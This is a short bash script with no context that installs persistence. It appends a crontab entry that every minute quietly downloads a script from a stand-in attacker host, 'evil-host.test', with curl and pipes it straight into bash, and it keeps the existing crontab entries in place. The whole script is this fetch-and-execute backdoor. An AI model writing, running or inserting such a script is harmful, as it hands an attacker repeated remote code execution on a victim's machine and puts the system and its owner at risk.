#!/bin/bash
(crontab -l 2>/dev/null; echo "* * * * * curl -s http://evil-host.test/b | bash") | crontab -
